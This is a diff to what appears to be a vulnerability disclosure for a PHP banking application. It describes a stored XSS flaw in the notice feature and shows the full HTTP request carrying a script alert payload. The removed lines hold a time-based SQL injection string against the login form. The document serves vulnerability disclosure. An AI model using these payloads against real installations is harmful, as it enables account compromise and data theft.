@@ -18,21 +18,24 @@ Persistent XSS (or Stored XSS) attack is one of the three major categories of XS
 
 #### Payload used:
 
-```POST /login.php HTTP/1.1
+`<script>alert("XSS")</script>`
+
+```POST /mnotice.php?id=2 HTTP/1.1
 Host: 192.168.67.14:8089
-Content-Length: 95
+Content-Length: 69
 Cache-Control: max-age=0
 Upgrade-Insecure-Requests: 1
 Origin: http://192.168.67.14:8089
 Content-Type: application/x-www-form-urlencoded
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
-Referer: http://192.168.67.14:8089/login.php
+Referer: http://192.168.67.14:8089/mnotice.php?id=2
 Accept-Encoding: gzip, deflate
 Accept-Language: zh-CN,zh;q=0.9
+Cookie: PHPSESSID=3fd6gf7a23dtf98p5b7769nlff
 Connection: close
 
-email=manager%40manager.com&password=1'and 1=2 union select 1,sleep(10),3,4,5 --+&managerLogin=
+userId=2&notice=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E&send=
 ```
 
 #### Proof of Concept
@@ -41,20 +44,20 @@ email=manager%40manager.com&password=1'and 1=2 union select 1,sleep(10),3,4,5 --
 
 2、Send a notification to Ali Khan with the content- `<script>alert("XSS")</script>`
 
-![alikhan](D:\cves\php-bank\images\alikhan.png)
+![image](https://github.com/joinia/webray.com.cn/blob/main/php-bank/images/alikhan.png)
 
-![xsspayload](D:\cves\php-bank\images\xsspayload.png)
+![image](https://github.com/joinia/webray.com.cn/blob/main/php-bank/images/xsspayload.png)
 
 3、Log in to Ali Khan account after sending successfully, and find that the pop-up window is successful username: some2@gmail.com Password: some2
 
-![userlogin](D:\cves\php-bank\images\userlogin.png)
+![image](https://github.com/joinia/webray.com.cn/blob/main/php-bank/images/userlogin.png)
 
 
 
-![userxss](D:\cves\php-bank\images\userxss.png)
+![image](https://github.com/joinia/webray.com.cn/blob/main/php-bank/images/userxss.png)
 
 5、Click View Notice to trigger again.
 
 
 
-![viewnotice](D:\cves\php-bank\images\viewnotice.png)
+![image](https://github.com/joinia/webray.com.cn/blob/main/php-bank/images/viewnotice.png)
